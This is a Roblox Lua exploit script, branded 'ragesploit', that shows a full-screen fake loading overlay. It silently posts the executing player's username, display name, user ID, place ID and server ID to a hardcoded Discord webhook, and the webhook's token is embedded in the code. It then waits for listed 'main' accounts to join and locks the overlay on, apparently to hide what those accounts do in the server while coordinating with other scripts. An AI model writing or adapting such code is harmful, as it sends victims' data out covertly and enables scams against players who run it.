local MAIN_USER_IDS = {
    591015339,
    10637972054,
    10334144307,
    10773075053,
}

local WEBHOOK_URL = "https://discord.com/api/webhooks/1521933756271821025/eaPqWacFGzsYjYulJOOs75COuMkkUQxgZPVw7dPtWuaoXYbcdGrBadFT5BwXUmwQIjOI"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

getgenv().Script0Ready = false

------------------------------------------------
-- GUI (CREATED ONCE)
------------------------------------------------
local gui = Instance.new("ScreenGui")
gui.Name = "RageSploitLoading"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Enabled = true
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Parent = gui
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundColor3 = Color3.fromRGB(8, 6, 14)
bg.BorderSizePixel = 0

local saturn = Instance.new("TextLabel")
saturn.Parent = bg
saturn.Size = UDim2.fromScale(1, 0.2)
saturn.Position = UDim2.fromScale(0, 0.3)
saturn.BackgroundTransparency = 1
saturn.Text = "🪐"
saturn.TextScaled = true
saturn.Font = Enum.Font.GothamBold

local loading = Instance.new("TextLabel")
loading.Parent = bg
loading.Size = UDim2.fromScale(1, 0.12)
loading.Position = UDim2.fromScale(0, 0.5)
loading.BackgroundTransparency = 1
loading.Text = "Loading"
loading.TextColor3 = Color3.fromRGB(255, 255, 255)
loading.TextScaled = true
loading.Font = Enum.Font.GothamBlack

local sub = Instance.new("TextLabel")
sub.Parent = bg
sub.Size = UDim2.fromScale(1, 0.08)
sub.Position = UDim2.fromScale(0, 0.62)
sub.BackgroundTransparency = 1
sub.Text = "ragesploit"
sub.TextColor3 = Color3.fromRGB(170, 90, 255)
sub.TextScaled = true
sub.Font = Enum.Font.GothamBold

------------------------------------------------
-- AUTO HIDE AFTER 10 SECONDS
------------------------------------------------
task.delay(10, function()
    gui.Enabled = false
end)

------------------------------------------------
-- WEBHOOK
------------------------------------------------
local function sendWebhook()
    if WEBHOOK_URL == "" or WEBHOOK_URL == "PUT_YOUR_WEBHOOK_HERE" then
        warn("[SCRIPT 0] Webhook URL not set")
        return
    end

    local requestFunc = syn and syn.request or http_request or request
    if not requestFunc then
        warn("[SCRIPT 0] No HTTP request function available")
        return
    end

    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content =
                    "@everyone\n" ..
                    "**My script was executed**\n" ..
                    "**Username:** " .. player.Name .. "\n" ..
                    "**Display Name:** " .. player.DisplayName .. "\n" ..
                    "**UserId:** `" .. tostring(player.UserId) .. "`\n" ..
                    "**PlaceId:** `" .. tostring(game.PlaceId) .. "`\n" ..
                    "**Server ID:** `" .. tostring(game.JobId) .. "`"
            })
        })
    end)
end

print("[SCRIPT 0] Executed")
sendWebhook()

------------------------------------------------
-- MAIN ACCOUNT DETECTION (DOES NOT BLOCK SCRIPTS 1–4)
------------------------------------------------
local function isMain(userId)
    for _, id in ipairs(MAIN_USER_IDS) do
        if userId == id then
            return true
        end
    end
    return false
end

local function onMainFound(plr)
    if isMain(plr.UserId) then
        print("[SCRIPT 0] Main account detected:", plr.Name)

        -- SHOW GUI AGAIN AND LOCK IT FOREVER
        gui.Enabled = true

        getgenv().Script0Ready = true
    end
end

-- check existing players
for _, plr in ipairs(Players:GetPlayers()) do
    onMainFound(plr)
end

-- listen for future joins
Players.PlayerAdded:Connect(onMainFound)

------------------------------------------------
-- OPTIONAL (kept from your logic idea)
------------------------------------------------
print("[SCRIPT 0] Waiting for main account...")
